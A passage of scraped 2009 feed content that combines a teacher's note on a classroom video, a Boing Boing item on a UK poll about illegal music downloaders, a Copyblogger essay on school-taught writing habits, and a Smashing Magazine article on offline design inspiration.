thoughts on the subject. What separates great design? What little things do you key on?</p>\n<div>\n<a href=\"http://feeds.feedburner.com/~ff/MyInkBlog?a=L-hJ8biYHbA:DFMwHV0qajw:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/MyInkBlog?d=yIl2AUoC8zA\" border=\"0\"></a> <a href=\"http://feeds.feedburner.com/~ff/MyInkBlog?a=L-hJ8biYHbA:DFMwHV0qajw:7Q72WNTAKBA\"><img src=\"http://feeds.feedburner.com/~ff/MyInkBlog?d=7Q72WNTAKBA\" border=\"0\"></a> <a href=\"http://feeds.feedburner.com/~ff/MyInkBlog?a=L-hJ8biYHbA:DFMwHV0qajw:V_sGLiPBpWU\"><img src=\"http://feeds.feedburner.com/~ff/MyInkBlog?i=L-hJ8biYHbA:DFMwHV0qajw:V_sGLiPBpWU\" border=\"0\"></a> <a href=\"http://feeds.feedburner.com/~ff/MyInkBlog?a=L-hJ8biYHbA:DFMwHV0qajw:gIN9vFwOqvQ\"><img src=\"http://feeds.feedburner.com/~ff/MyInkBlog?i=L-hJ8biYHbA:DFMwHV0qajw:gIN9vFwOqvQ\" border=\"0\"></a> <a href=\"http://feeds.feedburner.com/~ff/MyInkBlog?a=L-hJ8biYHbA:DFMwHV0qajw:qj6IDK7rITs\"><img src=\"http://feeds.feedburner.com/~ff/MyInkBlog?d=qj6IDK7rITs\" border=\"0\"></a> <a href=\"http://feeds.feedburner.com/~ff/MyInkBlog?a=L-hJ8biYHbA:DFMwHV0qajw:F7zBnMyn0Lo\"><img src=\"http://feeds.feedburner.com/~ff/MyInkBlog?i=L-hJ8biYHbA:DFMwHV0qajw:F7zBnMyn0Lo\" border=\"0\"></a> <a href=\"http://feeds.feedburner.com/~ff/MyInkBlog?a=L-hJ8biYHbA:DFMwHV0qajw:D7DqB2pKExk\"><img src=\"http://feeds.feedburner.com/~ff/MyInkBlog?i=L-hJ8biYHbA:DFMwHV0qajw:D7DqB2pKExk\" border=\"0\"></a>\n</div><img src=\"http://feeds.feedburner.com/~r/MyInkBlog/~4/L-hJ8biYHbA\" height=\"1\" width=\"1\">"

It was another experiment in video editing and mixing video with live action.\r\n\r\nUPDATE: NOV 1, 2009\r\nThanks for all the compliments. I appreciate it. All this attention was quite a surprise - I mainly posted the video for the students who weren&#39;t in class that day, and so my students could pass it on to a few friends. After the first version started getting a bunch of hits, I wished I had spent a little time cleaning up the audio, so I posted &quot;Version 2,&quot; which is pretty much the same, but my voice turned up a bit.\r\n\r\nI&#39;ve read a bunch of comments, and I have a few general responses:\r\n\r\nMath: No, I wasn&#39;t actually trying to teach anything with the video - it was just for fun. This was the last 5 minutes of a 75 minute class - I actually taught real math for the first 70 minutes. And yes, I love teaching this class, and I try to keep it lively by doing little fun things like this once in a while.\r\n\r\nSoftware/Camera: I used Pinnacle Studio Ultimate, version 12.1 - the &quot;picture-in-picture&quot; feature for the special effects. I filmed it with a simple Panasonic PV-GS35 MiniDV camcorder.\r\n\r\nIdea/Time: I did this last semester as an April Fool&#39;s joke. New class, new year, I decided to try it again, with a few more twists. It took me about 45 minutes to film the video, maybe 2 hours to edit and refine it, then I practiced the interaction with the video a couple times.\r\n\r\nClass: This was filmed with a video camera on a tripod in the back of class, with about 80 people in class that day. Those are real people, not a laugh track. The class is called &quot;Nature of Math,&quot; and is a general education class for non-math people. We do some basic math and study the history and philosophy of math. Yes, that&#39;s Edwin Abbott&#39;s &quot;Flatland&quot; I mention - students have to read it for the class.\r\n\r\nBiola (biola.edu) is a private Christian university located in a Los Angeles suburb. I don&#39;t place much significance in Halloween, but I don&#39;t mind trivializing the day, and making it just about candy and costumes. The disclaimer at the end of version 2 is an imitation of the disclaimer Michael Jackson put at the beginning of his &quot;Thriller&quot; video. (BTW, Biola grad Judith Hill sang the last song at his funeral. Yeah, Biola!)\r\n\r\nSo thanks again for all your generous comments. I&#39;m glad you enjoyed the video. I hope it inspires you to go out and do creative, fun things of your own.</div>"

      "content" : "A new British independent poll conducted by Ipsos Mori concluded that the people who do the most illegal downloading also buy the most music. This is in line with many other studies elsewhere and is easy to understand: people who are music superfans do more of <em>everything</em> to do with music: they see more live shows, listen to more radio, buy more CDs, buy more botlegs of live shows, buy more t-shirts, talk about music more, do more downloading -- all of it. \n<p>\nAnd of course, these are the people the music industry's supergeniuses have set their sights upon for bizarre enforcement regimes like the one that British Business Secretary Peter Mandelson has promised: anyone who lives in a house that generates three or more copyright infringement notices will be barred from Internet access. \n\n<blockquote>\n\"The latest approach from the Government will not help prop up an ailing music industry. Politicians and music companies need to recognise that the nature of music consumption has changed, and consumers are demanding lower prices and easier access,\" said Peter Bradwell, from the think-tank Demos, which commissioned the new poll conducted by Ipsos Mori.\n<p>\nHowever, music industry figures insist the figures offer a skewed picture. The poll suggested the Government's plan to disconnect illegal downloaders if they ignore official warning letters could deter people from internet piracy, with 61 per cent of illegal downloaders surveyed admitting they would be put off downloading music illegally by the threat of having their internet service cut off for a month.\n<p>\n\"The people who file-share are the ones who are interested in music,\" said Mark Mulligan of Forrester Research. \"They use file-sharing as a discovery mechanism. We have a generation of young people who don't have any concept of music as a paid-for commodity,\" he continued. \"You need to have it at a price point you won't notice.\"\n\n\n</p></p></blockquote>\n\n<a href=\"http://www.independent.co.uk/news/uk/crime/illegal-downloaders-spend-the-most-on-music-says-poll-1812776.html\">\nIllegal downloaders 'spend the most on music', says poll</a>\n\n(<i>Thanks, Libbi!</i>)\n<p>\n<div>\n<em>Previously:</em><ul><li><a href=\"http://www.boingboing.net/2009/09/15/brits-sign-petititio.html#previouspost\">Brits: sign petitition to kill proposal to disconnect accused ...</a></li>\n<li><a href=\"http://www.boingboing.net/2009/09/18/open-rights-group-fo.html#previouspost\">Open Rights Group forum on proposal to cut British households off ...</a></li>\n<li><a href=\"http://www.boingboing.net/2009/10/28/brit-business-secret.html#previouspost\">Brit business secretary promises to punish accused file-sharers ...</a></li>\n<li><a href=\"http://www.boingboing.net/2009/08/25/uk-govt-proposes-idi.html#previouspost\">UK govt proposes idiotic two-strikes-and-you&#39;re-out Internet ...</a></li>\n<li><a href=\"http://www.boingboing.net/2009/10/29/my-times-editorial-o.html#previouspost\">My Times editorial on British plan to cut relatives of accused ...</a></li>\n</ul>\n</div><br style=\"clear:both\">\n<br style=\"clear:both\">\n<a href=\"http://ads.pheedo.com/click.phdo?s=8539901a6579779e1eb182b05e7d64fa&amp;p=1\"><img alt=\"\" style=\"border:0\" border=\"0\" src=\"http://ads.pheedo.com/img.phdo?s=8539901a6579779e1eb182b05e7d64fa&amp;p=1\"></a>\n<img alt=\"\" height=\"0\" width=\"0\" border=\"0\" src=\"http://a.rfihub.com/eus.gif?eui=2226\"><img src=\"http://feeds.feedburner.com/~r/boingboing/iBag/~4/ry3Yx54bS3Y\" height=\"1\" width=\"1\"></p></p>"

They’ll tell you it makes a point and supports it with evidence. Maybe, if they’re really honest, they’ll admit it has a scholarly tone — prose that sounds like Jane Austen earns an A, while a paper that could’ve been written by Willie Nelson scores a B (or worse).</p>\n<p><span></span>Not all English teachers abide by this system, but the vast majority do. Just look at the writing of most graduates, and you’ll see what I mean. It’s proper, polite, and just polished enough not to embarrass anyone. Mission accomplished, as far as our schools are concerned.</p>\n<p>But let me ask you something:</p>\n<h3>Is that <em>really</em> good writing?</h3>\n<p>I think most good writers listen to the way English teachers want them to write and think, “This isn’t real. It has no feeling, no distinctiveness, no oomph. You’re the only person in the world who would willingly read it. Everyone else would rather chew off their own eyelids than read more than three pages of this boring crap.” And they’re right.</p>\n<p>Compare an award-winning essay to a best-selling novel, and you’ll notice that they are written in almost completely different languages. Some of it has to do with the audience, sure. It’s natural to write differently for academics than you would for everyday people. But my question is: who are you going to spend more time writing for?</p>\n<p>My guess: everyday people — your family and friends, your blog audience, your boss at work, maybe even a Letter to the Editor every now and again. None of them are academics. None of them want to read an essay.</p>\n<p>Personally, I think good writing doesn’t have to be educated or well supported or even grammatically correct. It <em>does</em> have to be interesting enough that other people <em>want</em> to read it. Much of what comes out of high schools and universities fails this test, <a href=\"http://blog.penelopetrunk.com/2009/10/19/the-internet-creates-an-era-of-great-writing/\">not because our students are incapable of saying anything interesting</a>, but because a well-meaning but flawed academic system has taught them a lot of bad habits.</p>\n<p>Let’s go through some of them.</p>\n<h3>1. Trying to sound like dead people</h3>\n<p>It’s a sad state of affairs when the youngest writer on your reading list has been dead 100 years, but that’s the way it is in school. </p>\n<p>I don’t know who exactly decides what’s worth reading and what’s not, but they (whoever “they” are) believe in reading the “classics,” and most of those classics are centuries old. What’s worse is that many teachers hold up the classics as examples of what good writing is, and they expect you to mimic those writers with your essays.</p>\n<p>Sure, Chaucer and Thomas More and Shakespeare were the stud muffins of their day, but you don’t see them on the <em>New York Times</em> Bestseller List now. </p>\n<p>Not because they aren’t good (they were freaking <em>great</em>), but because people can’t connect with them. By mimicking their style, you might make a few teachers happy, but you’re essentially handicapping your writing in the eyes of the public.</p>\n<p>If you want to make a connection, you’re much better off studying the hot writers of today — like Stephen King, J.K. Rowling, and Seth Godin. Watch what they do, and play with using some of their techniques in your own writing. </p>\n<p>Yes, you’ll still be mimicking the work of another writer, but at least you’ll be mimicking something people <em>want</em> to read.</p>\n<h3>2. Expecting someone to hand you a writing prompt</h3>\n<p>Looking through the eyes of an educator, I can see why telling students what to write about would be useful. You have a bunch of students who couldn’t care less about your curriculum, and making them write a paper about the assigned readings is a great way to force them to read the material.  </p>\n<p>Makes sense . . . but it doesn’t make it any less damaging.</p>\n<p>One of the biggest challenges of writing is figuring out <em>what</em> to write. Whether you’re writing a memo, an article, or a letter to your mother, the process is always the same: you start out with a blank page, and <em>you</em> decide what to put on it.  </p>\n<p>Sure, that involves considering what your audience will want to read, but <a href=\"http://www.copyblogger.com/use-writers-block/\">no one but you makes the final decision</a> of what to put on the page. That act of <em>deciding</em> is what writing is all about.</p>\n<h3>3. Writing long paragraphs</h3>\n<p>Once upon a time, it was acceptable to write paragraphs long enough to fill multiple pages with big blocks of text. </p>\n<p>Not surprisingly, that’s the way most of us were taught to write: long paragraphs, topic sentences neatly organized, lots of supporting evidence in between assertions. It was the “correct” way to write.</p>\n<p>Not.</p>\n<p>Any.</p>\n<p>More.</p>\n<p>Nowadays, most paragraphs should be a maximum of three sentences. It’s also a good idea to include some shorter paragraphs with only one or two sentences, using them to punctuate powerful ideas. </p>\n<p>It’s not so much about having a “correct” length as using paragraphs to <a href=\"http://www.copyblogger.com/duke-ellington-copy/\">give your writing rhythm</a>. </p>\n<h3>4. Avoiding profanity at all costs</h3>\n<p>I admit it; this is a controversial one. Many excellent writers still hold that profanity has no place in a professional publication, while others curse like <a href=\"http://ittybiz.com/\">a lovable two-dollar, er, paid companion</a>. </p>\n<p>The rest of us sit around feeling uncomfortable and wondering whether it’s okay to express ourselves “that way” or not.</p>\n<p>So who’s right? Well, I think Stephen King says it best:</p>\n<blockquote><p>Make yourself a promise right now that you’ll never use “emolument” when you mean “tip” and you’ll never say John stopped long enough to perform an act of excretion when you mean John stopped long enough to take a shit. If you believe “take a shit” would be considered offensive or inappropriate by your audience, feel free to say John stopped long enough to move his bowels (or perhaps John stopped long enough to “push”). I’m not trying to get you to talk dirty, only plain and direct.</p></blockquote>\n<p>‘Nough said.</p>\n<h3>5. Leaning on sources</h3>\n<p>Most kids I knew hated digging up sources and quoting them in their papers, but not me. No, the sneaky little bugger that I was (and still am), I realized that sources were an escape route from creativity. With enough quotations from other writers, I could fill up an entire paper without coming up with a single original thought of my own. </p>\n<p>And I was rewarded for it. From kindergarten to getting my degree in English Literature, I got an A on all but like five papers.</p>\n<p>Here’s why: a lot of teachers care more about solid research than original ideas. They don’t want to see daring and inventive arguments, challenging the foundation of everything we hold to be true and arguing boldly for a new worldview. To them, it’s much more important that you understand the ideas of others and be able to cite them in MLA format.</p>\n<p>But real life is the opposite. </p>\n<p>Go around citing the sources of all of your ideas and people will start avoiding you, because it’s <em>boring as hell</em>. </p>\n<p>They don’t care who said what, and they aren’t interested in hearing the chronology of an idea. What they want to hear is a new perspective on a favorite topic. </p>\n<p>If it comes from you, that’s fine. If it doesn’t, that’s fine too.</p>\n<h3>6. Staying detached</h3>\n<p>We are taught that good writing puts the focus on the subject, not the writer. It’s unemotional. It gives equal attention to opposing points of view, presenting them all without singling out one as best.</p>\n<p>And sometimes, it’s true. If you’re a scientist, engineer, or a doctor, then maintaining your role as a detached observer is a great idea.</p>\n<p>For everyone else though, it’s a disaster. </p>\n<p>Have you ever read the stuff scientists, engineers, and other so-called “detached observers” write? It’s boring! Outside of their exclusive circles, you couldn’t pay people to read it.</p>\n<p>If you want people to <em>want</em> to read what you write, then you should do the opposite. Be more like Oprah Winfrey, Howard Stern, Gary Vaynerchuk. They are opinionated, have a unique style, and are prone to emotional outbursts.</p>\n<p>It’s no coincidence. That’s what makes them interesting.</p>\n<h3>7. Listening to “authorities” more than yourself</h3>\n<p>Who am I to criticize the writing habits you learned in school?</p>\n<p>Well . . . nobody.</p>\n<p>Yes, I’m a professional writer. Yes, I have a literature degree. Yes, other writers have paid me up to $200 an hour to edit their work, and they’ve been amazed when all I did was correct the above mistakes.</p>\n<p>But that doesn’t mean I’m right. In fact, that’s probably the most important lesson you can learn about writing:</p>\n<p>No one but you is an authority on <em>your</em> writing.</p>\n<p>Not me. Not your English teachers. Not Strunk and White and their highfalutin <em>Elements of Style</em>.</p>\n<p>The longer you write, the more you’ll realize that other writers can’t tell you what to do.  You should listen to more experienced writers, sure, but never more than you listen to yourself.</p>\n<p>Great writers don’t learn how to write by sitting in writing courses, reading writing blogs, or browsing Barnes &amp; Noble for yet more books on writing. </p>\n<p>They learn how to write by coming to a blank page, writing something down, and then asking themselves if it works. </p>\n<p>If it does, they keep it. If it doesn’t, they don’t. Then they repeat the process until they finish something they feel is worth publishing.</p>\n<h3>Sadly, most writers don’t know this</h3>\n<p>They labor under the mistaken assumption that there is an invisible standard of good and bad. And they worry that the Writing Police are going to show up at their door any minute, handcuff them, and haul them off to jail for failing to measure up.</p>\n<p>If that was true, you wouldn’t see a single writer walking the street without one of those blinking bracelets around their ankle.</p>\n<p>The truth is that you’re in charge. <em>You.</em> The blank page is sitting there, and you can fill it up with whatever the hell you want.</p>\n<p>So stop sitting there, silly.</p>\n<p>Go for it. </p>\n<p><em><strong>About the Author:</strong> Jon Morrow is Associate Editor of Copyblogger and Cofounder of <a href=\"http://www.partneringprofits.com/\">Partnering Profits</a>.

Designers use these at certain times for a quick fix of inspiration, especially when the pressure of deadlines prevent them from seeking out offline, or “alternative,” forms of inspiration, as important as they are.</p>\n<p>No designer should ever feel that taking time to find true inspiration is time wasted. This article <strong>explores offline sources of inspiration</strong> and discusses how they can be treated as a part of the design process. Furthermore, we’ll look into a few methods of deriving this inspiration, so it becomes an active part of creativity and be done more effectively.</p>\n<p>Also consider our previous articles:</p>\n<ul>\n<li><a href=\"http://www.smashingmagazine.com/2009/08/23/expand-your-horizons-with-other-tech-projects/\" rel=\"bookmark\">Expand Your Development Skills With Creative Tech Projects</a><br>This article will help you discover new new development skills with some creative projects.</li>\n<li><a href=\"http://www.smashingmagazine.com/2009/05/10/drawing-inspiration-from-music/\" rel=\"bookmark\" title=\"Drawing Inspiration From Music\">Drawing Inspiration From Music</a><br>A look at how designers can take an alternative approach and find inspiration through music.</li>\n<li><a href=\"http://www.smashingmagazine.com/2009/08/27/if-famous-painters-were-web-designers/\" rel=\"bookmark\" title=\"If Famous Graphic Artists Were Web Designers…\">If Famous Graphic Artists Were Web Designers…</a><br>A smart collection of examples of how other designers have turned traditional art into their practice.</li>\n</ul>\n<h3>1. Stop The Quick Fix Of Online Inspiration</h3>\n<p>The first step to getting into the habit of finding offline, or “natural,” inspiration is to stop looking at online inspiration in the first place. For many designers, online is the first place to look. It shouldn’t be.</p>\n<p>The problem with showcases and galleries is that most of us tend to copy bits and pieces of them, thus creating a mish-mash of everything we’ve seen. This isn’t how design, or any creative field, should work. While graphic and Web designers are different from traditional artists, we should treat the creative “back end” any different. After all, we got into this field to be creative and express our artistic talents, so why don’t we?</p>\n<h4>Online Inspiration Isn’t Bad</h4>\n<p>Before delving any deeper, let’s get one thing straight: the point of this article is not to say that online inspiration isn’t unproductive in any way. In fact, it is quite a good thing and can very well produce the intended effect.</p>\n<p>The unproductive part is when designers turn to it as their sole channel of inspiration. Showcases and galleries, rather, serve best as examples of best practices and ideas. Our designs should stem instead from our own creativity, aided by this online inspiration.</p>\n<h4>How to Stop the Cycle</h4>\n<p>For many of us, going to a CSS gallery the moment we start working on a new project is routine. Whether because we are behind in our work or just anxious to get started, true inspiration gets put on the backburner more and more over time. Hopefully, this article will help convince you that finding true inspiration is necessary to the design process. Even if you’re convinced, though, breaking old habits can be hard.</p>\n<p>The trick is to consider alternative inspiration an <em>an essential part of the job</em>. While it feels more like play than work at first, finding true inspiration should mean more than browsing through the same material over and over. And we should know that in a creative industry, having fun is okay; it doesn’t mean we’re being unproductive.</p>\n<p>We have to consider taking a walk, visiting a museum and sketching as parts of our job description, things that help us get our jobs done faster and less painfully. We’ll discuss below when we should seek out these other forms of inspiration and when it is okay to sift through galleries and showcases.</p>\n<h3>2. Forms Of Offline Inspiration</h3>\n<p>Let’s start by discussing what we can do to derive new forms of offline inspiration. Below are some tried and true methods for uplifting one’s inner creativity… without using a browser.</p>\n<h4>Nature</h4>\n<p>Nature is easily one of the places to find inspiration. Not only does it have variety, color and interest, but it takes its effect on us by mere instinct. Because of this, finding inspiration on a walk, a hike or just sitting in a park doesn’t take much effort. Let’s look at a few specific places where one can find it, though.</p>\n<p><strong>Weather</strong><br>Weather is just one part of what nature has to offer. Because weather is so closely related to mood, it can be a great source of inspiration. Think of your favorite season, a stormy night or a sunny day at the beach; take in the colors, textures and mood and implement them in a design.</p>\n<p><img src=\"http://media2.smashingmagazine.com/wp-content/uploads/images/offline-inspiration/nature_weather.jpg\" width=\"500\" height=\"500\" alt=\"Nature Weather\"></p>\n<p><strong>Life Forms</strong><br>While weather can influence and inspire mood, life forms have yet far more variety than weather. Whether plant life or animals, a number of exquisitely designed elements are available from which to draw inspiration, through texture, shape, color, etc.</p>\n<p><img src=\"http://media2.smashingmagazine.com/wp-content/uploads/images/offline-inspiration/life.jpg\" alt=\"Life\" width=\"500\" height=\"500\"></p>\n<p><strong>Geography and Landscape</strong><br>Geography and landscape is another major source of inspiration. Taking in your natural surroundings can have a calming effect on your mind and motivate you to design. Beyond whatever comes to you naturally, look at shape, texture and color, too.</p>\n<p><a href=\"http://www.flickr.com/photos/wolfgangstaudt/2174481713/\"><img src=\"http://media1.smashingmagazine.com/wp-content/uploads/images/offline-inspiration/wolfgangstaudt.jpg\" width=\"500\" height=\"304\" alt=\"Wolfgang Staudt New Mexico\"></a></p>\n<p>The above are just a few quick examples of how nature can and should be used for inspiration. These are definitely the first choices for many designers who want a new creative outlook, and for a great reason.</p>\n<p>The trick is to figure out how to get <em>workable</em> inspiration from nature and integrate it into a design. For specific examples on how to achieve this in detail, check out <a href=\"http://www.webdesignerdepot.com/2009/08/17-techniques-for-creating-designs-inspired-by-nature/\">17 Techniques for Creating Designs Inspired by Nature</a>.</p>\n<h4>Museum Visits</h4>\n<p>Like nature, simply walking through a museum can relieve stress and, in turn, inspire. It doesn’t have to be a museum for art or design either. A science museum, historical museum or even aquarium or zoo can work. The point is to see things that are not in our everyday lives, while being in an environment that allows you to really focus on and appreciate them.</p>\n<p>Being in a museum can lead us to new things, such as:</p>\n<ul>\n<li>Alternative cultures and their arts;</li>\n<li>Traditional or classical art;</li>\n<li>An attention to different senses and a more empirical way of thinking (think of a science museum);</li>\n<li>Weird, strange or outrageous exhibits to help us think outside of the box (like a “Ripley’s Believe It or Not” museum);</li>\n<li>Historical objects that are shown in photographs and other media.</li>\n</ul>\n<p><a href=\"http://www.flickr.com/photos/watz/1014065171/\"><img src=\"http://media1.smashingmagazine.com/wp-content/uploads/images/offline-inspiration/museum.jpg\" width=\"500\" height=\"375\" alt=\"Musuem\"></a><br><em><a href=\"http://www.flickr.com/photos/watz/1014065171/\">Image source</a></em></p>\n<p>Because these experiences can lead to such alternative ways of thinking, they are great for getting away from the daily grind that is suppressing your imagination.</p>\n<h4>Drawing and Sketching</h4>\n<p>Many designers begin a project by sketching, but far too many jump straight into wireframes, layouts and then the final draft.</p>\n<p>Instead of starting the design phase cold, sketch freely. Doodle, draw ideas, sketch abstract and non-abstract textures and shapes. When sketching for inspiration, don’t think of it as any other stage in the design process. Have fun with it; be carefree and laid back. Free-drawing is a great way to put all of those ideas in your head down on paper.</p>\n<p><a href=\"http://www.gomediazine.com/tutorials/comic_book_style/\"><img src=\"http://media2.smashingmagazine.com/wp-content/uploads/images/offline-inspiration/drawing.jpg\" width=\"500\" height=\"369\" alt=\"Advanced Sketching\"></a><br><em><a href=\"http://www.gomediazine.com/tutorials/comic_book_style/\">Comic Book Style</a> on GoMediaZine.com</em></p>\n<p>Many designers very likely grew up sketching and drawing. A lot of us probably had books or other resources on “How to draw,” explaining the technical aspects of drawing characters and other subjects. Doing this now at a more advanced level can be inspirational. Doing so, we advance our skills and are motivated to practice new illustration techniques. So, make an effort to refine your basic drawing and sketching skills.</p>\n<p>For a great list of tutorials, check out <a href=\"http://vector.tutsplus.com/articles/inspiration/40-free-tutorials-on-advanced-drawing-techniques/\">40 Free Tutorials on Advanced Drawing Techniques</a>.</p>\n<h4>An Alternative Hobby</h4>\n<p>Experiencing new things is a part of life. Without this, we fall into a rut. Think about it: when we began designing, we were full of ideas, motivation and inspiration. After doing it for so long, though, designing can become routine and uninspiring.</p>\n<p>This is a part of life. But we obviously can’t quit our jobs and pursue unrelated goals whenever we feel like it. Instead, we must find a way to keep life exciting while maintaining our careers.</p>\n<p>Try a new hobby that you find exciting, and then bring it into your designs. For example, if you’re learning a new language, incorporate the culture and styles associated with that language into your designs. If you’re learning a new craft, how can you incorporate the textures, shapes and actions of it into a design? Countless hobbies are out there. No matter how quirky or seemingly unproductive yours is, if you have a passion for it, it will help.</p>\n<p><a href=\"http://www.flickr.com/photos/balakov/3317358958/\"><img src=\"http://media2.smashingmagazine.com/wp-content/uploads/images/offline-inspiration/quirkyhobby.jpg\" width=\"500\" height=\"334\" alt=\"Quirky Hobby\"></a><br><em><a href=\"http://www.flickr.com/photos/balakov/3317358958/\">Image source</a></em></p>\n<p>It doesn’t even have to be a hobby, but just something to get your mind off of work. For example, if you’re redecorating a room, there had to be some initial inspiration that drew you into it; use that spark in your design. Other life experiences involving family, friends and events can play a role in design, too.</p>\n<p>The point is to enjoy hobbies and general life events more, and stop thinking of them as unrelated to work.</p>\n<h4>Music</h4>\n<p>Music brings emotion and puts imagery in our heads. It is a great art to jog our imagination.</p>\n<p>While the techniques mentioned thus far may appeal only to some people, everyone should try music, because it relies on no visual source and can lead to the most creative outcomes. Deriving inspiration from music may not be as easy (because it is more abstract than a pattern, texture or shape), but it certainly gets our imagination and creativity flowing.</p>\n<p><a href=\"http://www.behance.net/Gallery/The-music-nature/51596\"><img src=\"http://media1.smashingmagazine.com/wp-content/uploads/images/offline-inspiration/music.jpg\" width=\"500\" height=\"802\" alt=\"Music Inspired Art\"></a><br><em><a href=\"http://www.behance.net/Gallery/The-music-nature/51596\">Image source</a></em></p>\n<p>How you use this method is really up to you, but for more tips, check out Smashing’s other post, “<a href=\"http://www.smashingmagazine.com/2009/05/10/drawing-inspiration-from-music/\">Drawing Inspiration From Music</a>.”</p>\n<h4>Photography</h4>\n<p>Using photos is an excellent way to incorporate many of the above methods, without having to travel around the world. Flying across the world to see the wildlife in the jungle or a foreign culture’s practices is not practical. Photographs, rather, capture real-life images from which you can draw inspiration and come up with texture, shapes, subjects and more.</p>\n<p><a href=\"http://www.flickr.com/photos/themechanism/3373620858/sizes/o/\"><img src=\"http://media1.smashingmagazine.com/wp-content/uploads/images/offline-inspiration/photography.jpg\" width=\"500\" height=\"375\" alt=\"Photography\"></a><br><em><a href=\"http://www.flickr.com/photos/themechanism/3373620858/sizes/o/\">Image source</a></em></p>\n<p>While photography can be considered “online inspiration,” it is different in that one cannot take bits of a photograph and turn it directly into a design (the way you can with another website). Rather, one must use skill and creativity to turn it into a workable design, just as you would use a natural object in the wild.</p>\n<p>Below are a few favorite photography showcases to get you inspired:</p>\n<ul>\n<li><a href=\"http://designfinds.me/other/35-black-white-photos-of-interest\">35 Black &amp; White Photos of Interest</a></li>\n<li><a href=\"http://www.smashingmagazine.com/2009/09/09/beautiful-black-and-white-photography-2/\">Beautiful Black and White Photography</a></li>\n<li><a href=\"http://www.smashingmagazine.com/2009/09/25/beautiful-examples-of-kinetic-photography/\">Beautiful Examples of Kinetic Photography</a></li>\n<li><a href=\"http://www.smashingmagazine.com/2009/06/26/35-examples-of-stunning-macro-photography/\">35 Examples Of Stunning Macro Photography</a></li>\n<li><a href=\"http://www.smashingmagazine.com/2009/07/24/stunning-space-photography/\">Stunning Space Photography</a></li>\n<li><a href=\"http://webitect.net/general/40-delightful-pieces-of-tilt-shift-photography/\">40 Delightful Pieces of Tilt-Shift Photography</a></li>\n</ul>\n<h4>Traditional Art</h4>\n<p>Each era of art has its own style and development. We often focus too much on today’s trends that we forget all of the excellent art of the past.</p>\n<p>Research any era of art history. You will discover many great works of art, as well as techniques that the masters of that era followed.</p>\n<p><a href=\"http://en.wikipedia.org/wiki/File:Jacques-Louis_David,_Le_Serment_des_Horaces.jpg\"><img src=\"http://media2.smashingmagazine.com/wp-content/uploads/images/offline-inspiration/classicalart.jpg\" width=\"500\" height=\"396\" alt=\"Neoclassical Art\"></a><br><em><a href=\"http://en.wikipedia.org/wiki/File:Jacques-Louis_David,_Le_Serment_des_Horaces.jpg\">Image source</a></em></p>\n<p>As with any other form of inspiration, take texture, color, shape, style and depth into account. In viewing art from different eras and cultures, we can draw inspiration from the style without copying the subject.</p>\n<h4>One’s Own Imagination</h4>\n<p>Think like a child again. With a bit of relaxation, we can come up with our own ideas again, without even an external trigger of the imagination. We can’t elaborate much more on this: the method will be unique to each individual. But it is bound to create the most original designs of all.</p>\n<p>For a few fun tips on how to be imaginative, take a look at the simple WikiHow article “<a href=\"http://www.wikihow.com/Be-Imaginative\">“How to Be Imaginative</a>.”</p>\n<h3>3. Deriving Inspiration From These Sources</h3>\n<p>Knowing how to find inspiration through alternative sources comes down to the art and science of design. Rather than merely copy trends and examples, we have to use our knowledge of texture, shape, proximity and so forth to build fresh design. Our new sources of inspiration may now be difficult to harness but are sure to release our creativity.</p>\n<p>Here following are some basic guidelines you can take to derive inspiration from any offline source.</p>\n<h4>Look at Texture</h4>\n<p>Many sources of inspiration are visual in nature, which means they may have interesting textures, whether from an animal skin or a wrinkled petal.</p>\n<p>Many designs are not much more than texture at all. But even without conventional imagery, we understand the design perfectly well.</p>\n<p><a href=\"http://www.kevinlucius.com/\"><img src=\"http://media2.smashingmagazine.com/wp-content/uploads/images/offline-inspiration/lucius.jpg\" width=\"500\" height=\"348\" alt=\"Kevin Lucius\"></a><br><em><a href=\"http://www.kevinlucius.com/\">Kevinlucius.com</a></em></p>\n<h4>Everything Has a Shape</h4>\n<p>Everything has a shape that highlights its texture. We look at different shapes every day, but rarely do we stop to appreciate it. No matter what it is taken from, a design could resemble the source of inspiration itself or just bits and pieces of it.</p>\n<p>Take the time to examine the object’s shape, angles, edges and dimensions. They may spark new ideas or lead to an idea for an element in your design.</p>\n<p><a href=\"http://lillystable.com/\"><img src=\"http://media1.smashingmagazine.com/wp-content/uploads/images/offline-inspiration/lillys.jpg\" width=\"500\" height=\"337\" alt=\"Lilly&#39;s Table\"></a><br><em><a href=\"http://lillystable.com/\">Illystable.com</a></em></p>\n<h4>Color and Palettes</h4>\n<p>Nature-inspired Web design was quite a trend there for a while, and it is still going pretty strong. The trend is notable because color is given such special attention and is implemented so carefully in designs. Green, blue and brown earthy hues are incredibly popular, and these colors and a bit of authentic texture are all a design needs to be nature-inspired.</p>\n<p>We can apply the same attention to other offline sources of inspiration. For example, painters from different eras preferred different color palettes, and we can borrow these palettes for today’s designs. Likewise, different cultures, landscapes and imagery all provide a unique sets of colors to inspire us. All we have to do is stop and take notice.</p>\n<p><a href=\"http://www.foodincmovie.com/\"><img src=\"http://media1.smashingmagazine.com/wp-content/uploads/images/offline-inspiration/hungryforchange.jpg\" width=\"500\" height=\"340\" alt=\"Hungry for Change\"></a><br><em><a href=\"http://www.foodincmovie.com/\">FoodIncMovie.com</a></em></p>\n<h4>Take an Alternative Perspective</h4>\n<p>Viewing the things we see every day from a fresh perspective makes them design-worthy. This could mean viewing them close up, upside down, from far away or from an entirely different angle. Whatever you choose, look at an object from an unusual perspective to discover something new about it.</p>\n<p><a href=\"http://www.ormanclark.com/\"><img src=\"http://media2.smashingmagazine.com/wp-content/uploads/images/offline-inspiration/orman.jpg\" width=\"500\" height=\"390\" alt=\"Orman Clark\"></a><br><em><a href=\"http://www.ormanclark.com/\">Ormanclark.com</a></em></p>\n<h4>Choose a Theme</h4>\n<p>We can be motivated to create something new after winding down for the day, after taking a walk, or after viewing some interesting photographs. But when it comes down to actually designing, we may still not know where to begin.</p>\n<p>Just as we did when writing essays back in high school, we must first define our design’s theme; that is, come up with a “thesis” for our design. We may be inspired by Renaissance art that we viewed at a museum, but we might find that there is too much in the artwork to base a design on.</p>\n<p>This is when we need to get specific. Should your design reflect the textures, colors and shapes of that era, or should it evoke a typical publication of that era (a website being a publication itself after all)?</p>\n<p>Come up with a specific subject and idea for the design, taken from your much broader source of inspiration. Don’t just go with a nature theme; choose a cheerful snowy morning theme. Don’t use a book as a whole, but rather use an event recounted in the book, or an emotion that the event evokes.</p>\n<p>You could incorporate a number of ideas from any source of inspiration, so be specific and choose one particular message to guide the design.</p>\n<h4>Collect Resources and Bits of Inspiration</h4>\n<p>Before starting 